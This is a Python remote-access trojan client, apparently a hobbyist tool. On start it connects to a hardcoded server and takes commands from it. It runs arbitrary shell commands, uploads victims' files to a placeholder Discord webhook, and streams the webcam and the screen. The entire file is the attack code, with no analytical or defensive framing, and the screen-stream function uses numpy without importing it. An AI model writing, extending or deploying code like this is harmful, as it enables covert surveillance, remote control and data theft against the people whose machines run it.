import socket
import subprocess
import cv2
import struct
import time
import requests
import os

server_ip = "10.0.1.33"
server_port = 9999
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

def send_frame():
    global client
    cap = cv2.VideoCapture(0)
    
    while True:
        ret, frame = cap.read()
        if not ret:
            break

        _, encoded = cv2.imencode('.jpg', frame)
        client.sendall(struct.pack(">L", len(encoded)) + encoded.tobytes())

    cap.release()

def send_screen():
    import pyautogui
    while True:
        screenshot = pyautogui.screenshot()
        _, encoded = cv2.imencode('.jpg', cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR))
        client.sendall(struct.pack(">L", len(encoded)) + encoded.tobytes())

while True:
    try:
        command = client.recv(1024).decode().strip()
        
        if command.startswith("!shell"):
            shell_cmd = command[7:]
            output = subprocess.getoutput(shell_cmd)
            client.send(output.encode())

        elif command.startswith("!download"):
            filename = command.split(" ", 1)[1]
            if os.path.exists(filename):
                with open(filename, "rb") as f:
                    requests.post("YOUR_DISCORD_WEBHOOK_URL", files={"file": f})

        elif command.startswith("!webcam_stream"):
            send_frame()

        elif command.startswith("!screen_stream"):
            send_screen()

        elif command.startswith("CTRL+P"):
            print("[ * ] Stopping stream...")
            break

    except Exception as e:
        print(f"[ - ] Error: {e}")
        break
